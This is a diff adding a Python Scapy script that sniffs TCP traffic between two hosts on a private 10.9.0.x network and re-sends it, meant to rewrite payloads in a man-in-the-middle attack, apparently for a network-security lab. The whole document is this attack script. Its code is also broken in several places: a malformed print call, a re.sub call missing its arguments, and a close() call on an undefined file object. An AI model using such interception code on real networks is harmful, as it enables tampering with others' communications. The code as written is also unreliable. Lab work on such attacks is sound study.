@@ -1,0 +1,44 @@
+#!/usr/bin/env python3
+from scapy.all import *
+
+IP_A = "10.9.0.5"
+MAC_A = "02:42:0a:09:00:05"
+
+IP_B = "10.9.0.6"
+MAC_B = "02:42:0a:09:00:06"
+
+IP_M = "10.9.0.105"
+MAC_M = "02:42:0a:09:00:69"
+
+print("Starting the attack")
+
+def spoof_pkt(pkt):
+    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B: 
+    	 
+         newpkt = IP(bytes(pkt[IP]))
+         
+         del(newpkt.chksum)
+         del(newpkt[TCP].payload)
+         del(newpkt[TCP].chksum)
+
+         if pkt[TCP].payload:
+             data = pkt[TCP].payload.load
+             print("length: %d" % (data, len(data))
+
+             newdata = re.sub(data)
+
+             send(newpkt/newdata)
+         else: 
+             send(newpkt)
+         File_object.close()
+
+    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+         newpkt = IP(bytes(pkt[IP]))
+         del(newpkt.chksum)
+         del(newpkt[TCP].chksum)
+         send(newpkt)
+
+f = 'tcp and (ether src ' + MAC_A +  ' or ' + \
+             'ether src ' + MAC_B +  ' )'
+pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
+
